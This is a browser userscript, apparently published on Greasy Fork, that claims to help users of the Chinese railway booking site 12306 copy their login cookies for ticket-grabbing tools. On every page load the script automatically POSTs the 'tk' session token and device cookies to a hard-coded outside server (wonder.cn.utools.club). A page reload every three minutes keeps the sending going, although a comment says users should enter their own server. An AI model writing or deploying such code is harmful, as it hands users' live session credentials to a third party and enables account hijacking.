// ==UserScript==
// @name         获取12306cookie值
// @namespace    https://kyfw.12306.cn/
// @version      0.3
// @description  我们的目的是在登录12306网站后，方便、快速的获取到抢票需要的cookie值。
// @author       wonder
// @match        https://kyfw.12306.cn/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/419934/%E8%8E%B7%E5%8F%9612306cookie%E5%80%BC.user.js
// @updateURL https://update.greasyfork.org/scripts/419934/%E8%8E%B7%E5%8F%9612306cookie%E5%80%BC.meta.js
// ==/UserScript==

(function() {
    //'use strict';

    //console.log($("body").html());
    //console.log("【总cookie】",document.cookie)
    function getCookie(cname) {
        var name = cname + "=";
        //var decodedCookie = decodeURIComponent(document.cookie);
        var cookieStr = document.cookie;
        var ca = cookieStr.split(';');
        for(var i = 0; i <ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length, c.length);
            }
        }
        return "";
    }

    if(getCookie("tk")==""){
      //alert("tk为空！");
        console.log("tk为空！");
    }else{
        //如果tk不为空
          console.log(getCookie("tk")+"====时间:"+new Date().toLocaleTimeString());
//         console.log(getCookie("RAIL_EXPIRATION"));
//         console.log(getCookie("RAIL_DEVICEID"));

        document.getElementsByClassName("center-main")[0].innerHTML="【=========获取到tk========】"+"<br>"
            +"【tk】:<br> "+"<span style='color:red;'>"+getCookie("tk")+"</span><br>"
            +"【RAIL_EXPIRATION】:<br> "+"<span style='color:red;'>"+getCookie("RAIL_EXPIRATION")+"</span><br>"
             +"【RAIL_DEVICEID】:<br> "+"<span style='color:red;'>"+getCookie("RAIL_DEVICEID")+"</span><br>"
            +"<br><br><button id='send'>发送到服务器</button><span>自动保持登录，并持续发送到服务器，直到离开当前页面。</span>"


        //ajax上传服务器  //点击事件
        document.getElementById("send").onclick=sendData;
         //发送数据
         sendData();

        setTimeout(function(){
            //刷新页面
           location.reload(true);

        },3000*60);

        //保持登录，并发送到服务器
//         setInterval(function(){
//               // console.log(1);

//            // https://kyfw.12306.cn/otn/login/conf
//              var xhr = new XMLHttpRequest();
//             //创建一个 post 请求，采用异步
//             xhr.open('POST', 'https://kyfw.12306.cn/otn/login/conf', true);
//             //注册相关事件回调处理函数
//             xhr.onload = function(e) {
//                 if(this.status == 200||this.status == 304){
//                     //console.log(this.responseText);
//                 }else{
//                    console.log("error");
//                 }
//             };
//             xhr.send();

//             if(getCookie("tk")!=tk_temp){
//                 tk_temp = getCookie("tk");
//                console.log("tk发生改变：",new Date().toLocaleTimeString());

//                    document.getElementsByClassName("center-main")[0].innerHTML="【=========获取到tk========】"+"<br>"
//             +"【tk】:<br> "+"<span style='color:red;'>"+getCookie("tk")+"</span><br>"
//             +"【RAIL_EXPIRATION】:<br> "+"<span style='color:red;'>"+getCookie("RAIL_EXPIRATION")+"</span><br>"
//              +"【RAIL_DEVICEID】:<br> "+"<span style='color:red;'>"+getCookie("RAIL_DEVICEID")+"</span><br>"
//             +"<br><br><button id='send'>发送到服务器（开发中）</button><span>自动保持登录，并持续发送到服务器，直到离开当前页面。</span>"

//              //var data = {tk:getCookie("tk"),rail_expiration:getCookie("RAIL_EXPIRATION"),rail_deviceid:getCookie("RAIL_DEVICEID")};
//              //发送数据
//              sendData();
//             }
//              console.log(getCookie("tk"));
           
//            },2000*60); //每分钟发送一次


//   不知道为什么不能引用jq，所以只能用原生js写了。
//          $("#send").click(function(){
//              alert("功能开发中~");
//             console.log("发送数据到服务器~");
//             $.ajax(
//                 {
//                     url:"https://api.github.com/",
//                     type:"post",
//                     data:{},
//                     success:function(res){
//                         console.log("服务器返回结果：",res);
//                     }
//                 }
//             );

//         })

    }




function sendData()
{
    var data = {tk:getCookie("tk"),rail_expiration:getCookie("RAIL_EXPIRATION"),rail_deviceid:getCookie("RAIL_DEVICEID")};
    //alert("接收cookie程序开发中~");
    var xmlhttp;
    if (window.XMLHttpRequest)
    {// code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    }
    else
    {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
             //alert(typeof xmlhttp.response);
            console.log(xmlhttp.response)
            var result = JSON.parse(xmlhttp.response);
            console.log(typeof result);
            if(result.code==200){
              console.log("发送成功！");
                
            }else{
              console.log("发送失败!");
            }
        }
    }
    //请把https://api.github.com改为自己的服务器地址。 请确保该地址为https 开头，而不是http
    //xmlhttp.open("POST","https://wonder.test.utools.club/cookie",true);https://e0cf1d50ed6d.ngrok.io/

    xmlhttp.open("POST","https://wonder.cn.utools.club/cookie",true);

    xmlhttp.setRequestHeader('Content-Type','application/json');
     console.log("JSON==================",JSON.stringify(data));
    //将用户输入值序列化成字符串
    xmlhttp.send(JSON.stringify(data));  //向服务器发送tk值
    //xmlhttp.send();
}

    // Your code here...
})();